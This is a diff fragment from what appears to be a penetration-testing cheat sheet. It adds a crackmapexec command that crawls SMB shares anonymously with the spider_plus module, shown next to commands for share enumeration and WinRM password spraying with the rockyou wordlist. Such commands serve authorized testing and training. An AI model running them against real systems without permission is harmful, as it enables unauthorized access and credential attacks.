@@ -2098,6 +2098,7 @@ sqsh -S <RHOST> -U <USERNAME>
 
 ```c
 crackmapexec smb <RHOST> -u '' -p '' --shares
+crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus
 crackmapexec smb <RHOST> -u <USERNAME> -p <PASSWORD> --shares
 crackmapexec winrm -u usernames.txt -p '<PASSWORD>' -d <DOMAIN> <RHOST>
 crackmapexec winrm <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
